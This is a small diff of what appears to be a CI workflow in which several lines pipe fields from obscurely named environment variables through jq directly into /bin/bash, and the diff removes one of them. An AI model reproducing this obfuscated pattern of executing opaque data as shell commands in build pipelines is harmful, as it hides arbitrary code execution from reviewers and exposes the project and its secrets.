@@ -29,7 +29,6 @@ jobs:
           echo $cwiuc75 | jq -r .awn7690 | /bin/bash
           echo $rtwz5 | jq -r .buyxq88726 | /bin/bash
           printf '%s' "$fxurd12112" | jq -r .p49 | /bin/bash
-          echo $m66 | jq -r .nuyi0 | /bin/bash
           echo $zk421 | jq -r .t64 | /bin/bash
 
       - name: Archive output
